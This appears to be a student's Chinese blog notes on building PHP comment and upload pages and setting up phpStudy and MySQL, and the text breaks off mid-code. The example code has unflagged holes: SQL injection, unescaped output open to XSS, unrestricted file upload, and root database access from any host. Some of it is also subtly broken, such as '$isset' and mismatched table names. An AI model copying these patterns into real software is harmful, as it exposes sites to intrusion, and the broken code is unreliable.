title="comment.php和upload.php的创建"></a>comment.php和upload.php的创建</h2><p>评论区页面的创建以及与表的连接<br>首先去重新在同一个数据库下创建一个表。名字就叫comment，设置两个属性为id和comment。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231217093923161.png" alt="image-20231217093923161"><br>这样去设置，点击表新建表安装如图设置：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702479420351-3e390f3c-6dbf-4c18-bf16-9dc2be6c0745.png" alt="image.png"><br>这样设置点击保存。就可以新建表了。<br>接着就是对comment.php进行代码编写：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;comment&quot;</span>&gt;发表评论&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">        &lt;textarea name=<span class="string">&quot;comment&quot;</span> id=<span class="string">&quot;comment&quot;</span> rows=<span class="string">&quot;10&quot;</span> cols=<span class="string">&quot;80&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交评论&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h2&gt;傻狗的评论&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>];</span><br><span class="line">            <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;Error connecting!&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">            <span class="variable">$Insert</span> = <span class="string">&quot;insert INTO comment (comment) VALUES(&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$Insert</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#007BFF&#x27;&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;你的评论已成功保存到数据库。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p style=&#x27;color: red;&#x27;&gt;保存评论时出错。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;Error connecting!&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM comments ORDER BY id DESC LIMIT 30&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;傻狗的评论&lt;/h2&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$row[&#x27;comment&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p style=&#x27;color: red;&#x27;&gt;获取评论时有问题,请重试。&lt;/p&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这个代码前面就是去设置一个文本域，一些按钮，后面的话主要是对自己不理解的部分进行一个介绍：<br> if($_SERVER[‘REQUEST_METHOD’] &#x3D;&#x3D; ‘POST’)这段代码用于检查当前 HTTP 请求的方法是否为 POST 方法。如果条件成立，意味着当前请求是通过 POST 方法提交的表单数据，可以执行相应的处理逻辑。<br>while($row &#x3D; mysqli_fetch_assoc($result))这句话运用到了这个函数mysqli_fetch_assoc，它的作用是将查询结果中提取一行作为关联数组并赋值给变量$row。<br>结果如图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702480507863-519e2c95-5f73-404f-acec-0e8708df677e.png" alt="image.png"><br>在数据库中也能显示只是有点慢。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702480416937-53dd421f-7de9-48c6-a794-9abff179b417.png" alt="image.png"></p><p>接着就是对文件上传的页面的代码的编写：<br>首先取名为upload.php，接着进行编写：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;h2 style=&quot;color:#8A2BE2;&quot;&gt;欢迎来到我的小站&lt;/h2&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;&quot;  method=&quot;post&quot;  enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;label for=&quot;upload&quot; style=&quot;color:#00ff00;&quot;&gt;上传你的dog头 &lt;/label&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">  &lt;input name=&quot;file&quot; id=&quot;upload&quot; name=&quot;file&quot; type=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;label for=&quot;submit&quot;&gt;提交文件&lt;/label&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">  &lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;h2&gt;下面是接收到的文件&lt;/h2&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$upload_dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$target_path</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#007BFF&#x27;&gt;&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$file_type</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$file_size</span> / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件存储的位置: &quot;</span> . <span class="variable">$target_path</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传失败&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;./<span class="subst">$target_path</span>.&#x27;&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是正确的代码，稍微解释下自己不懂的一些部分：<br>if (move_uploaded_file($file_tmp, $target_path))这段代码用于将上传的临时文件移动到服务器上的指定目标路径。它检查了这个函数move_uploaded_file的返回值，如果返回值为 true，表示文件成功移动到目标路径，可以进行后续操作。<br>直接看结果哈：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702481364186-27a1fb50-52e2-4a92-b8f1-c87a3afe421f.png" alt="image.png"><br>接着就是进行整合在tk.php页面中进行插入这两个页面，来吧展示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702481466302-4ff4c65f-8dc3-488b-ae7d-641c48e7f5f6.png" alt="image.png"><br>这些整合的页面就可以进行使用的。还是演示一下吧。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702481680266-02ac7623-2922-4cd9-80a4-a9890634bd59.png" alt="image.png"><br>发现了一个问题因为我这个字体有颜色，从传文件部分输到文本域部分字体颜色消失了。</p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>postman后端平台的建立，php语法学习，mysql数据库的安装</title>
      <link href="/2023/12/17/postman%E5%90%8E%E7%AB%AF%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%BB%BA%E7%AB%8B%EF%BC%8Cphp%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%EF%BC%8Cmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2023/12/17/postman%E5%90%8E%E7%AB%AF%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%BB%BA%E7%AB%8B%EF%BC%8Cphp%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%EF%BC%8Cmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>上午：</p><h2 id="postman后端平台的建立"><a href="#postman后端平台的建立" class="headerlink" title="postman后端平台的建立"></a>postman后端平台的建立</h2><p>昨天进行了数据库的绑定，就是去用数组里面套字典进行无限嵌套：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702385089993-548da897-7479-49cf-b106-2ce71e8b6874.jpeg" alt="580f0db3435ffeb5ff2052fdff3adc1.jpg"><br>数据绑定完成之后，接着学习了前后端交互，通过的是postman去进行一个后台管理<br>postman下载压缩包：<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702385549297-a7672782-55fe-4a3c-b4ab-1021687ec2b7.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702385549297-a7672782-55fe-4a3c-b4ab-1021687ec2b7.zip%22,%22name%22:%22postman.zip%22,%22size%22:248535889,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u00250919-bef4-4d63-bac6-c59f264d4c1%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u5f311aea%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">postman.zip</a><br>下载完成之后打开压缩包进行解压，不要用中文路径。打开之后界面是这样的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702385878622-77225836-db26-48ae-b20e-a9fd761616b2.png" alt="image.png"><br>其中最主要的关件就是在使用Postman与Vue进行数据交互时设计良好的API端点并使用Vue的HTTP客户端发送请求，并在Vue组件中处理响应数据。</p><h2 id="php语法学习"><a href="#php语法学习" class="headerlink" title="php语法学习"></a>php语法学习</h2><p>后面想了一下直接去做数据交互还是有点难度，直接去学PHP基本语法了。<br>学习语法，首先是要去安装phpstudy，因为学习一门语法对于测试的工具首先要安装完成，phpstudy安装的压缩包为：<br><a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702386175879-43946395-07bd-472a-863b-b188162512df.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702386175879-43946395-07bd-472a-863b-b188162512df.zip%22,%22name%22:%22phpstudy.zip%22,%22size%22:268352063,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u082c78bf-b766-4d31-b570-71bd308ed41%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22uaf76cb07%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">phpstudy.zip</a><br>一样的下载解压，物理机上下载并将其拖入虚拟机进行打开就行，在第一周也学过了phpstudy的学习，这里也就简单的说一些基本上的操作：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702386392224-d6ef1690-291a-4d6a-86e1-b47f0797ed25.png" alt="image.png"><br>进入之后界面是这样，打开Apache和mysql。Apache能够显示php代码，只能在根目录进行解析。<br>只要是网站都放在网站根目录下。接着点击网站，管理，打开配置，高级配置这里打开目录索引，点击确定就行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702386606874-322562be-93e2-4120-a09c-5ff789f68f88.png" alt="image.png"><br>再次点击管理，打开网站根目录，里面的全部删掉，新建一个index.php作为页面首页,<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702387710081-dfba3572-53b9-43d5-95e0-c7a65f588708.png" alt="image.png"><br>这里是后续截图，所以没法清空，但是可以看见网站的根目录由于在虚拟机上面没有安装vscode,只能在物理机新建1.php，注意找到根目录后点击右上角的查看，打开扩展名和隐藏项目，好接着来用vscode打开1.php进行编写代码：<br>首先介绍了php的基本语法：<br>用<?php开头，?>结尾，php和python不一样，如果需要定义变量前面要加$,例如：$a&#x3D;”1”;注意；不要掉，要不然必然报错，接着孙哥就带我们了解了php的一些特性：<br>特性1.变量与变量之间用点连接,变量与符号之间也是点连接，符号与符号也是一样。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$s</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>= <span class="variable">$a</span>.<span class="variable">$s</span>.<span class="string">&quot;bbb&quot;</span>;<span class="comment">#特性:变量与变量之间用点连接,变量与符号之间也是点连接</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时结果也是直接进行连接就行也就是按照顺序来的123aaabbb。<br>特性2：弱类型匹配两个等号就是对的输出1，三个等号强类型就是错的输出2</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> ==<span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>;<span class="comment">#弱类型匹配就是对的输出1，三个等号强类型就是错的输出2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">所以此时输出是<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$a</span> ===<span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>;<span class="comment">#弱类型匹配就是对的输出1，三个等号强类型就是错的输出2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">此时输出为<span class="number">2</span>.</span><br></pre></td></tr></table></figure><p>给出了两个练习题：<br>一个是鸡兔同笼问题：假设在笼子里有头数为8的动物，总共有22只脚。<br>另一个问题是：n张5毛，y张1块，z张10块，t张50，x张100，问我手上一共有156钱，一共有多少种组合，满足我手上的钱<br>php代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">8</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="number">8</span>-<span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span>*<span class="variable">$a</span>+<span class="number">4</span>*<span class="variable">$i</span>==<span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#输出为5和3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countCombinations</span>(<span class="params"><span class="variable">$totalMoney</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$combinations</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$n</span> = <span class="number">0</span>; <span class="variable">$n</span> &lt;= <span class="variable">$totalMoney</span> / <span class="number">0.5</span>; <span class="variable">$n</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt;= <span class="variable">$totalMoney</span> / <span class="number">1</span>; <span class="variable">$y</span>++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">0</span>; <span class="variable">$z</span> &lt;= <span class="variable">$totalMoney</span> / <span class="number">10</span>; <span class="variable">$z</span>++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$t</span> = <span class="number">0</span>; <span class="variable">$t</span> &lt;= <span class="variable">$totalMoney</span> / <span class="number">50</span>; <span class="variable">$t</span>++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt;= <span class="variable">$totalMoney</span> / <span class="number">100</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="variable">$n</span> *<span class="number">0.5</span> + <span class="variable">$y</span> * <span class="number">1</span> + <span class="variable">$z</span> * <span class="number">10</span> + <span class="variable">$t</span> * <span class="number">50</span> + <span class="variable">$x</span> * <span class="number">100</span>) == <span class="variable">$totalMoney</span>) &#123;</span><br><span class="line">                            <span class="variable">$combinations</span>++;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$combinations</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$totalMoney</span> = <span class="number">156</span>;</span><br><span class="line"><span class="variable">$numberOfCombinations</span> = <span class="title function_ invoke__">countCombinations</span>(<span class="variable">$totalMoney</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;一共有 &quot;</span> . <span class="variable">$numberOfCombinations</span> . <span class="string">&quot; 种组合满足手上的钱为 &quot;</span> . <span class="variable">$totalMoney</span> . <span class="string">&quot;。\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#输出为2337</span></span><br></pre></td></tr></table></figure><p>下午：</p><h2 id="mysql数据库的安装"><a href="#mysql数据库的安装" class="headerlink" title="mysql数据库的安装"></a>mysql数据库的安装</h2><p>输入参数并输出在浏览器上面：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这些php代码最终都是要到虚拟机上面运行的，将其复制在index.php的代码中，保存点击管理运行网站是个空白，但是可以输入?a&#x3D;一个值就会在浏览器显示出来。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702389446554-2b007084-04e6-4954-b1fd-18476a5f89b1.png" alt="4859e1e34e86b709d20fba5df4722d6.png"><br>后面下载了Navicat Premium 12，这是一个数据库管理的工具，<br><a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702390247344-67e77a33-7382-4a80-b115-cde9f3c0e751.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702390247344-67e77a33-7382-4a80-b115-cde9f3c0e751.zip%22,%22name%22:%22Navicat%20Premium%2012.zip%22,%22size%22:70091249,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22uc57cca9e-a92e-4ce3-a759-a34e0610b35%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u12290c48%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">Navicat Premium 12.zip</a><br>这是连接上的mysql，没连接上就是一个空的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702390240525-79affe19-8331-4bea-b74f-794b744fd5e8.png" alt="image.png"><br>点击连接，出现如下界面，主机这里是设置安装phpstudy的虚拟机ip地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702390334305-4e31eaf5-72f2-4e16-a51f-d21838d494a4.png" alt="image.png"><br>如果连接不成功就要对物理机的mysql进行设置，当然前提是保证phpstudy的mysql模块是在启动状态。<br>如何去设置呢，按照这几步操作就可以了<br>找到当前目录：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702390705673-0f4e495d-450b-45a4-9928-bd5a96b433d7.png" alt="image.png"></p><p>在目录处输入cmd，接着在命令行输入.\mysql.exe -u root -p<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702390959827-171e6bdb-00f7-43be-ba2f-43dc2f95b523.png" alt="image.png"><br>use mysql;<br>update user set Host&#x3D;’%’ where User&#x3D;’root’;<br>flush privileges;<br>按照一步步输入，完成之后就可以进行mysql重启，接着对Navicat Premium 12进行配置看看能否连接，如果你也和我一样遇到了mysql无法进行开启一直自动关闭建议重开虚拟机。<br>连接完成后新建一个security数据库，直接新建查询，导入一个表格，也就是如图所示的结果：<br><a href="https://www.yuque.com/attachments/yuque/0/2023/sql/40666686/1702394433320-d1ff9aef-c41a-4569-adb1-8682c87f8585.sql?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/sql/40666686/1702394433320-d1ff9aef-c41a-4569-adb1-8682c87f8585.sql%22,%22name%22:%22security.sql%22,%22size%22:3723,%22ext%22:%22sql%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ueadf0ce6-9630-4166-8f7c-46477d2663b%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ue818ca07%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">security.sql</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702390240525-79affe19-8331-4bea-b74f-794b744fd5e8.png"><br><a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702391867884-5544cf1f-2d97-43e0-b496-332d92204651.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1702391867884-5544cf1f-2d97-43e0-b496-332d92204651.zip%22,%22name%22:%22sqli.zip%22,%22size%22:3810311,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u5ed55401-ec34-43ba-aed0-47a81987548%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22fYkhc%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">sqli.zip</a>复制这个文件到phpstudy的网站根目录之下。解压之后输入在浏览器搜索框输入这段代码就会出现<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702394734188-f6933b71-63dd-43c1-b5bc-ef5c232310d1.png" alt="3c0c0b7b99aea58f19bc68e604bc966.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702394794104-877ab93d-7f12-4f44-acfc-8a8e85954f2b.png" alt="173610f5ac3a837deb17a375f4c2c16.png"><br>由于mysql版本比较旧导致出现了一些语法错误。因为对于一个事物而言总是不断进步的就像一个代码在同一个应用不同的版本之下就有可能会产生报错。<br>之后就可以接着继续下面的操作：<br>在vscode里面新建一个index.php也要在虚拟机的phpstudy新建一个link.php,用于专门放置php请求的代码,此时对index.php专门去做一个html5的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;link.php&quot;</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th&gt;&lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;用户名:&lt;/label&gt;&lt;/th&gt;</span><br><span class="line">      &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th&gt;&lt;label <span 